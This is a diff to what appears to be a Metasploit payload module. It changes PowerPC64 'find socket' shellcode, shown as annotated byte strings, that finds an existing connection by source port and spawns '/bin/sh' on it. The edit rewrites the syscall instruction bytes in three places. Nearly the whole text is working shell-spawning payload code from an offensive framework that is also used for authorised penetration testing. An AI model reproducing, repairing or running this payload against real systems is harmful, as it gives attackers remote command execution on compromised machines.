@@ -28,6 +28,7 @@ module MetasploitModule
                     'CPORT' => [ 86, 'n' ]
                   },
           'Payload' =>
+
                        "\x7f\xff\xfa\x78" + #   xor     r31,r31,r31                #
                        "\x3b\xa0\x01\xff" + #   li      r29,511                    #
                        "\x97\xe1\xff\xfc" + #   stwu    r31,-4(r1)                 #
@@ -46,7 +47,7 @@ module MetasploitModule
                        "\x7c\x24\x0b\x78" + #   mr      r4,r1                      #
                        "\x38\x7d\xfe\x08" + #   addi    r3,r29,-504                #
                        "\x38\x1d\xfe\x67" + #   addi    r0,r29,-409                #
-                       "\x44\xff\xff\x02" + #   sc                                 #
+                       "\x44\x00\x00\x02" + #   sc                                 #
                        "\x3b\x3c\x01\xff" + #   addi    r25,r28,511                #
                        "\xa3\x39\xfe\x03" + #   lhz     r25,-509(r25)              #
                        "\x28\x19\x04\xd2" + #   cmplwi  r25,1234                   #
@@ -55,7 +56,7 @@ module MetasploitModule
                        "\x7f\x04\xc3\x78" + #   mr      r4,r24                     #
                        "\x7f\xe3\xfb\x78" + #   mr      r3,r31                     #
                        "\x38\x1d\xfe\x40" + #   addi    r0,r29,-448                #
-                       "\x44\xff\xff\x02" + #   sc                                 #
+                       "\x44\x00\x00\x02" + #   sc                                 #
                        "\x37\x18\xff\xff" + #   addic.  r24,r24,-1                 #
                        "\x40\x80\xff\xec" + #   bge+    <fndsockcode64+96>         #
                        "\x7c\xa5\x2a\x79" + #   xor.    r5,r5,r5                   #
@@ -68,7 +69,7 @@ module MetasploitModule
                        "\xf8\x61\xff\xf9" + #   stdu    r3,-8(r1)                  #
                        "\x7c\x24\x0b\x78" + #   mr      r4,r1                      #
                        "\x38\x1d\xfe\x0c" + #   addi    r0,r29,-500                #
-                       "\x44\xff\xff\x02" + #   sc                                 #
+                       "\x44\x00\x00\x02" + #   sc                                 #
                        '/bin/sh'
         }
       )
